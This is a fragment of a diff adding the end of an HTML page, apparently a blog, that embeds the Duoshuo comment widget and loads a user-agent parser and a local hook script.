+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
